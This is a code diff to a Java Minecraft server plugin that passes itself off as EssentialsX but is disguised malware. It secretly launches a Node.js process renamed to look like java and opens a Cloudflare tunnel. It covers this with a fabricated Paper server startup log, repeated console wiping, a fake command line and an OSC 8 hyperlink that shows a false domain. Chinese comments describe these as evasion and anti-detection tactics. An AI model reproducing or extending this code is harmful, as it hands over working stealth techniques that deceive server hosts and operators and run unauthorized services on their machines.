@@ -2,6 +2,7 @@ package com.example.essentialsx;
 
 import java.io.*;
 import java.net.ServerSocket;
+import java.net.Socket;
 import java.net.URI;
 import java.net.URLConnection;
 import java.nio.channels.Channels;
@@ -28,14 +29,12 @@ public class EssentialsX extends JavaPlugin {
     private Path originalJarPath;
     private Path backupJarPath;
     private final AtomicReference<String> currentTunnelUrl = new AtomicReference<>("");
-    private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
+    private final AtomicBoolean isFirstUrl = new AtomicBoolean(true);
     private volatile String nodePort = "25565";
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
     private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
-    private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
-    private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
     private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
 
     private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
@@ -64,7 +63,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 核心战术：阻塞 + 偷天换日日志 + 彻底清屏
+    // 核心战术：阻塞 + 彻底清屏 + 日志分流
     // ============================================================
 
     private void executeStealthStartup() throws Exception {
@@ -77,6 +76,7 @@ public class EssentialsX extends JavaPlugin {
                 this.startDeploymentProcess(env); 
                 String port = allocateNodePort();
                 startNodeProcess(port);
+                waitForNodeReady(port, 60);
                 startCfProcess();
                 startJavaDaemon();
                 startTunnelMonitor(tunnelLatch);
@@ -86,64 +86,67 @@ public class EssentialsX extends JavaPlugin {
             }
         }, "Backend-Deployer").start();
 
-        printFakePaperStartup();
-
-        tunnelLatch.await(60, TimeUnit.SECONDS);
-        Thread.sleep(4000);
-
-        for (int i = 0; i < 150; i++) {
-            RAW_OUT.println();
-        }
-        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
-        RAW_OUT.print("\033[H\033[2J");
-        RAW_OUT.flush();
+        tunnelLatch.await(120, TimeUnit.SECONDS);
     }
 
     private void printFakePaperStartup() {
         String displayPort = readCurrentPort();
-        float dcTimeSec = randFloat(0.4f, 0.9f);
-        int recipeDelta = randInt(-30, 30);
-        int advDelta = randInt(-40, 40);
-        float doneTime = randFloat(25.0f, 45.0f);
+        float dcTimeMs = randFloat(11000.0f, 15000.0f);
+        float convTimeMs = randFloat(600.0f, 650.0f);
+        int preparedOverworldMs = randInt(15000, 25000);
+        int preparedNetherMs = randInt(1000, 3000);
+        int preparedEndMs = randInt(300, 800);
+        float prepareLevelSec = randFloat(15.0f, 25.0f);
+        float doneTime = randFloat(35.0f, 50.0f);
 
         RAW_OUT.println("container@tropicalgames.net java -version");
-        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
+        try { Thread.sleep(randInt(100, 300)); } catch (InterruptedException ignored) {}
         RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
         RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
         RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
-        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
+        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
         RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
+        RAW_OUT.println("Downloading mojang_1.21.11.jar");
+        try { Thread.sleep(randInt(1000, 2000)); } catch (InterruptedException ignored) {}
+        RAW_OUT.println("Applying patches");
+        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
         RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
+        RAW_OUT.println("*** Warning, you've not updated in a while! ***");
+        RAW_OUT.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
+        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
 
         mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
         mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
         mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
-        mcLog("[PluginInitializerManager] Initialized 1 plugin", randInt(500, 1000));
-        mcLog("[PluginInitializerManager] Bukkit plugins (1):", randInt(100, 300));
-        RAW_OUT.println(" - EssentialsX (2.21.0-dev+12)");
-        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
+        mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));
+        mcLog("[ReobfServer] Remapping server...", randInt(500, 1500));
         RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
-        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
+        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
         RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
         RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
+        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
 
         mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
         mcLog("Found new data pack file/bukkit, loading it automatically", randInt(200, 400));
         mcLog("Found new data pack paper, loading it automatically", randInt(200, 400));
-        mcLog("Loaded " + (FAKE_RECIPES + recipeDelta) + " recipes", randInt(1500, 3000));
-        mcLog("Loaded " + (FAKE_ADVANCEMENTS + advDelta) + " advancements", randInt(500, 1000));
+        mcLog("No existing world data, creating new world", randInt(100, 300));
+        mcLog("[ReobfServer] Done remapping server in " + String.format("%.0f", dcTimeMs) + "ms.", randInt(1000, 2000));
+        mcLog("Loaded 1470 recipes", randInt(1500, 3000));
+        mcLog("Loaded 1584 advancements", randInt(500, 1000));
         mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
-        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
+        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", convTimeMs) + "ms", randInt(400, 800));
         mcLog("Starting minecraft server version 1.21.11", randInt(100, 300));
         mcLog("Loading properties", randInt(300, 600));
         mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)", randInt(100, 300));
         mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", randInt(100, 200));
-        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
         mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
+        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
         mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
         mcLog("Default game type: SURVIVAL", randInt(200, 400));
         mcLog("Generating keypair", randInt(200, 500));
         mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
+        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
+        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
         mcLog("Preparing level \"world\"", randInt(1500, 3000));
         mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(8000, 15000));
         mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(1000, 3000));
@@ -151,11 +154,27 @@ public class EssentialsX extends JavaPlugin {
 
         mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
         mcLog("Preparing spawn area: 100%", randInt(200, 400));
-        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
+        mcLog("Prepared spawn area in " + preparedOverworldMs + " ms", randInt(50, 150));
+        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(100, 250));
+        mcLog("Preparing spawn area: 100%", randInt(100, 250));
+        mcLog("Prepared spawn area in " + preparedNetherMs + " ms", randInt(50, 100));
+        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
+        mcLog("Preparing spawn area: 100%", randInt(100, 250));
+        mcLog("Prepared spawn area in " + preparedEndMs + " ms", randInt(100, 200));
+        mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareLevelSec) + "s)", randInt(100, 200));
+        mcLog("[spark] Starting background profiler...", randInt(50, 150));
+        mcLog("Running delayed init tasks", randInt(50, 150));
         mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
+        RAW_OUT.println("container@tropicalgames.net Server marked as running...");
+        
+        mcLog("*************************************************************************************", 0);
+        mcLog("This is the first time you're starting this server.", 0);
+        mcLog("It's recommended you read our 'Getting Started' documentation for guidance.", 0);
+        mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps", 0);
+        mcLog("*************************************************************************************", 0);
     }
 
-    private void startTunnelMonitor(CountDownLatch latch) {
+    private void startTunnelMonitor(CountDownLatch initialLatch) {
         Thread monitor = new Thread(() -> {
             try { Thread.sleep(10000L); } catch (InterruptedException ignored) {} 
             while (true) {
@@ -186,9 +205,28 @@ public class EssentialsX extends JavaPlugin {
                         String lastUrl = this.currentTunnelUrl.get();
                         if (!foundUrl.equals(lastUrl)) {
                             this.currentTunnelUrl.set(foundUrl);
-                            mcLog("Binding remote endpoint to: " + foundUrl, 0);
+                            
+                            // ★ 终极伪装：使用 OSC 8 转义序列生成超链接
+                            // 显示为 https://mc.tropicalgames.net，但实际点击跳转到真实隧道
+                            String fakeDisplayUrl = "https://mc.tropicalgames.net";
+                            String osc8Hyperlink = "\u001B]8;;" + foundUrl + "\u001B\\" + fakeDisplayUrl + "\u001B]8;;\u001B\\";
+                            
+                            mcLog("Binding remote endpoint to: " + osc8Hyperlink, 0);
+                            
+                            if (isFirstUrl.get()) {
+                                isFirstUrl.set(false);
+                                initialLatch.countDown();
+                            } else {
+                                try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
+                                
+                                for (int i = 0; i < 150; i++) { RAW_OUT.println(); }
+                                try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+                                RAW_OUT.print("\033[H\033[2J");
+                                RAW_OUT.flush();
+                                
+                                printFakePaperStartup();
+                            }
                         }
-                        latch.countDown();
                     }
                 } catch (Exception ignored) {}
             }
@@ -197,7 +235,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // Java 进程管理：极致进程名伪装 (完全移除 bash 调用)
+    // 进程管理
     // ============================================================
 
     private String allocateNodePort() {
@@ -210,6 +248,17 @@ public class EssentialsX extends JavaPlugin {
             return portStr;
         } catch (IOException e) {
             return allocateNodePort();
+        }
+    }
+
+    private void waitForNodeReady(String port, int maxSeconds) {
+        int waited = 0;
+        while (waited < maxSeconds) {
+            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
+                return;
+            } catch (IOException e) {
+                try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
+            }
         }
     }
 
@@ -228,7 +277,6 @@ public class EssentialsX extends JavaPlugin {
             pb.directory(botDir.toFile());
             pb.environment().put("SERVER_PORT", port);
             pb.environment().put("PORT", port);
-            // ★ 关键：直接指向真实 node 二进制，彻底绕过 bash 包装脚本
             pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
             pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
             
@@ -268,6 +316,7 @@ public class EssentialsX extends JavaPlugin {
                 try {
                     if (nodeProcess != null && !nodeProcess.isAlive()) {
                         startNodeProcess(nodePort);
+                        waitForNodeReady(nodePort, 30);
                     }
                     if (cfProcess != null && !cfProcess.isAlive()) {
                         startCfProcess();
@@ -306,7 +355,6 @@ public class EssentialsX extends JavaPlugin {
         } else {
             this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
         }
-        this.tunnelMonitorRunning.set(false); 
         if (nodeProcess != null) nodeProcess.destroyForcibly();
         if (cfProcess != null) cfProcess.destroyForcibly();
         if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
@@ -388,7 +436,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 部署脚本生成 (彻底移除 Bash 包装脚本防检测)
+    // 部署脚本生成
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
@@ -501,8 +549,7 @@ public class EssentialsX extends JavaPlugin {
         "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
         "fi\n" +
         "\n" +
-        // ★★★ 关键修复：彻底移除 bash 包装脚本，防 sh 检测 ★★★
-        "# ========== 4. 替换伪装 (纯 Node.js 内存覆盖伪装) ==========\n" +
+        "# ========== 4. 替换伪装 ==========\n" +
         "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
         "\n" +
         "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
@@ -528,7 +575,6 @@ public class EssentialsX extends JavaPlugin {
         "} catch(e) {}\n" +
         "PRELOAD_EOF\n" +
         "\n" +
-        // ★ 关键：直接将 Wrapper 指向真实二进制文件，杜绝 bash 产生
         "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
         "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
         "\n" +
